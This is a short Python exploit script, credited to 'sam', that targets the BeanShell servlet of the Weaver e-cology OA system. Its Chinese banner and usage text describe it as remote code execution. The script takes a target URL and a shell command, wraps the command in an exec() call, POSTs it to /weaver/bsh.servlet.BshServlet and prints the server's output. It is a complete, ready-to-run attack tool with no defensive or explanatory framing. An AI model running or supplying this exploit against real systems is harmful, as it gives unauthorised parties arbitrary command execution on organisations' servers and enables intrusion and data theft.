import requests
import sys
print('''
     ____                  _____ __         ____    ____  ____________
    / __ )___  ____ _____ / ___// /_  ___  / / /   / __ \/ ____/ ____/
   / __  / _ \/ __ `/ __ \\__ \/ __ \/ _ \/ / /   / /_/ / /   / __/   
  / /_/ /  __/ /_/ / / / /__/ / / / /  __/ / /___/ _, _/ /___/ /___   
 /_____/\___/\__,_/_/ /_/____/_/ /_/\___/_/_____/_/ |_|\____/_____/   
 
               泛微e-cology OA Beanshell组件远程代码执行

                         python by sam
 
                   Usage:python3 OA.py url cmd
                如果cmd命令之间带空格，cmd命令请带双引号
    ''')
def BeanShell(url,cmd):
    Lurl=url+'/weaver/bsh.servlet.BshServlet'
    cmd='bsh.script=exec%28%22' + cmd + '%22%29%3b&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
    header={
        'Content-Type':'application/x-www-form-urlencoded'
    }
    print("漏洞URL："+Lurl)
    re=requests.post(url=Lurl,data=cmd,headers=header)
    print(re.text)
if __name__=="__main__":
    url1=sys.argv[1]
    cmd=sys.argv[2]
    BeanShell(url1,cmd)